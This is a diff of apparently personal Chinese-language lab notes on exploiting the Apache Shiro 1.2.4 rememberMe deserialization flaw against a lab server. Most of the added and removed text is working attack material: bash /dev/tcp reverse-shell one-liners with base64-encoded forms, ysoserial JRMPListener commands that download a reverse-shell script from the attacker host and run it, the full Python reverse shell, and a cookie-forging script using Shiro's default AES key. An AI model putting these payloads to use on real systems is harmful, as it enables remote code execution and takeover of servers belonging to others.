@@ -32,19 +32,14 @@ centos 192.168.207.3
 	got error 
 	The absolute uri: http://java.sun.com/jsp/jstl/core cannot be resolved in either web.xml or the jar 
 	change pom.xml
-		<dependency>
-			<groupId>javax.servlet</groupId>
-			<artifactId>jstl</artifactId>
-			<version>1.2</version>
-			<scope>provided</scope>
-		</dependency>
-		
+		这个是为了tomcat7下面能正常访问
 		<dependency>
 			<groupId>javax.servlet</groupId>
 			<artifactId>jstl</artifactId>
 			<version>1.2</version>
 			<scope>runtime</scope>
 		</dependency>
+		这个是为了跟ysoserial的依赖保持版本一致，去掉之后应该收不到tcp连接
 		<dependency>
 			<groupId>commons-beanutils</groupId>
 			<artifactId>commons-beanutils</artifactId>
@@ -56,12 +51,15 @@ centos 192.168.207.3
 				</exclusion>
 			</exclusions>
 		</dependency>
+		下面这个千万别加，加了之后ysoserial的JRMPListener直接收不到tcp连接！！！
+		<!--
 		<dependency>
 			<groupId>org.apache.commons</groupId>
 			<artifactId>commons-collections4</artifactId>
 			<version>4.0</version>
 		</dependency>
-
+		-->
+		下面这个有人提，但是貌似没用
         <dependency>
             <groupId>javax.servlet</groupId>
             <artifactId>servlet-api</artifactId>
@@ -69,81 +67,78 @@ centos 192.168.207.3
         </dependency>
 # exploit:
 kali 192.168.207.4
-## 开启监听
-nc -lvp 666
+## 开启监听，反弹shell监听
+nc -lvp 10000
+
+## 发送payload方法
+利用burpsuite；
+利用httpie； 
+	http http://192.168.207.3:8080/samples-web-1.2.4/ Cookie:`cat /tmp/payload.cookie`
+利用python脚本直接发送http请求携带cookie；
+
+#method 1 利用CommonsCollections5
+https://www.cnblogs.com/loong-hon/p/10619616.html
+service apache2 start
+cp getshell.py /var/www/html/
+
+第一个payload下载木马：
+python shiro.py 192.168.207.4:10001
+开启监听，收到靶机连接时下载木马
+java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 10001 CommonsCollections5 'wget 192.168.207.4/getshell.py -O /tmp/shell.py'
+发送payload
+第二个payload，其实跟第一个一样都是一个JRMPClient端，只不过由于可能是shiro sample web的原因，估计同一个cookie值会被忽略，所以如果不行就再生成一个payload
+同样是： python shiro.py 192.168.207.4:10001
+然后开启监听，这次直接运行shell脚本
+java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 10001 CommonsCollections5 'python /tmp/shell.py'
+
+#method 2 自定义ysoserial利用commons-collections-3.2.1
+shiro1.2.4 默认的依赖是 WEB-INF.lib.commons-collections-3.2.1.jar
+所以要自定义ysoserial的payload
+https://meizjm3i.github.io/2019/07/07/Commons-Collections%E6%96%B0%E5%88%A9%E7%94%A8%E9%93%BE%E6%8C%96%E6%8E%98%E5%8F%8AWCTF%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF%E4%B8%B2%E8%AE%B2/
+
+#method 3 利用CommonsCollections4 失败
 ## 构造payload
 核心payload：反弹shell
-bash -i >& /dev/tcp/192.168.207.4/666 0>&1
-/bin/bash -i >& /dev/tcp/192.168.207.4/666 0>&1
+bash -i >& /dev/tcp/192.168.207.4/10000 0>&1
 http://www.jackson-t.ca/runtime-exec-payloads.html
-bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwNy40LzY2NiAwPiYx}|{base64,-d}|{bash,-i}
+bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwNy40LzEwMDAwIDA+JjE=}|{base64,-d}|{bash,-i}
 开启ysoserial
-java -cp ysoserial.jar ysoserial.exploit.JRMPListener 777 CommonsCollections4 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwNy40LzY2NiAwPiYx}|{base64,-d}|{bash,-i}'
-#method 1
-python shiro.py 192.168.207.4:777
+java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 10001 CommonsCollections4 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwNy40LzEwMDAwIDA+JjE=}|{base64,-d}|{bash,-i}'
 
-import sys
-import uuid
-import base64
-import subprocess
-from Crypto.Cipher import AES
+python shiro.py 192.168.207.4:10001
 
-def encode_rememberme(command):
-    popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar', 'JRMPClient', command], stdout=subprocess.PIPE)
-    BS = AES.block_size
-    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
-    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
-    iv = uuid.uuid4().bytes
-    encryptor = AES.new(key, AES.MODE_CBC, iv)
-    file_body = pad(popen.stdout.read())
-    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
-    return base64_ciphertext
+# scripts
 
-
-if __name__ == '__main__':
-    payload = encode_rememberme(sys.argv[1])    
-print "rememberMe={0}".format(payload.decode())
-
-
-rememberMe=1HdAtcjiSVm2/83+p8V+x3gvxQQ+mm+u1eVqxA4QkHVyEPghfUNNa1CCkzpjqIpVMLbdWdYIzJNiyJfxpPTRTNs7LioxW9vvPow+cYynPX5vlshDlQCoc8hZ10WGA+GOr14CxT7mEaXaI7r8f7ZEJ4QUhOJWoP6HYA0/ye5q8uzqSA+eSmTglcOcqX6eLVpg+vZwipFuseUzEwjrudvnoUUHHAUv4qwbcFh40i7G9PPcAZPC/BoKTVqWqOTDrKo6385Gxpsl+bZWNl99G3JO9VnoiBwYCna10tzyxplZYeKlntyl3gRlLQj7jkCKoIyWTeVieGCITHTmnOStuXhN8Dic9HQaQFJtYTZb+XY1usZLD89qV/OqrmcbaxqE7Erkv4TgcnSI+sXwg91q6sklpg==
-rememberMe=1HdAtcjiSVm2/83+p8V+x3gvxQQ+mm+u1eVqxA4QkHVyEPghfUNNa1CCkzpjqIpVMLbdWdYIzJNiyJfxpPTRTNs7LioxW9vvPow+cYynPX5vlshDlQCoc8hZ10WGA+GOr14CxT7mEaXaI7r8f7ZEJ4QUhOJWoP6HYA0/ye5q8uzqSA+eSmTglcOcqX6eLVpg+vZwipFuseUzEwjrudvnoUUHHAUv4qwbcFh40i7G9PPcAZPC/BoKTVqWqOTDrKo6385Gxpsl+bZWNl99G3JO9VnoiBwYCna10tzyxplZYeKlntyl3gRlLQj7jkCKoIyWTeVieGCITHTmnOStuXhN8Dic9HQaQFJtYTZb+XY1usZLD89qV/OqrmcbaxqE7Erkv4TgcnSI+sXwg91q6sklpg==
-liu> 
-
-
-#method 2
-python create_payload.py "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwNy40LzY2NiAwPiYx}|{base64,-d}|{bash,-i}"
-python create_payload.py "bash -i >& /dev/tcp/192.168.207.4/666 0>&1"
-
+## getshell.py:
+	import socket,subprocess,os;
+	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+	s.connect(("192.168.207.4",10000));
+	os.dup2(s.fileno(),0);
+	os.dup2(s.fileno(),1);
+	os.dup2(s.fileno(),2);
+	p=subprocess.call(["/bin/sh","-i"]);
+## shiro.py:
 # pip install pycrypto
-import sys
-import base64
-import uuid
-from random import Random
-import subprocess
-from Crypto.Cipher import AES
+	import sys
+	import uuid
+	import base64
+	import subprocess
+	from Crypto.Cipher import AES
 
-def encode_rememberme(command):
-    popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar', 'CommonsCollections2', command], stdout=subprocess.PIPE)
-    BS   = AES.block_size
-    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
-    key  =  "kPH+bIxk5D2deZiIxcaaaA=="
-    mode =  AES.MODE_CBC
-    iv   =  uuid.uuid4().bytes
-    encryptor = AES.new(base64.b64decode(key), mode, iv)
-    file_body = pad(popen.stdout.read())
-    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
-    return base64_ciphertext
+	def encode_rememberme(command):
+		popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'JRMPClient', command], stdout=subprocess.PIPE)
+		BS = AES.block_size
+		pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
+		key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
+		iv = uuid.uuid4().bytes
+		encryptor = AES.new(key, AES.MODE_CBC, iv)
+		file_body = pad(popen.stdout.read())
+		base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
+		return base64_ciphertext
 
-if __name__ == '__main__':
-    payload = encode_rememberme(sys.argv[1])    
-    with open("/tmp/payload.cookie", "w") as fpw:
-        print("rememberMe={}".format(payload.decode()), file=fpw)
-		
-python create_payload.py "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwNy40LzY2NiAwPiYx}|{base64,-d}|{bash,-i}"
-# 安装了 httpie 可以运行如下指令
-http http://192.168.207.3:8080/samples-web-1.2.4/ Cookie:`cat /tmp/payload.cookie`
-
-http://192.168.207.3:8080/samples-web-1.2.4 'bash -i >& /dev/tcp/192.168.207.4/666 0>&1'
+	if __name__ == '__main__':
+		payload = encode_rememberme(sys.argv[1])    
+	print "rememberMe={0}".format(payload.decode())
 
 
 失败怀疑：
@@ -172,5 +167,6 @@ http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html
 
 https://blog.spoock.com/2018/10/31/reverse-shell-on-limited-environments/
 
+基于CommonsCollections4的Gadget分析
 https://www.cnblogs.com/Welk1n/p/10511145.html
 
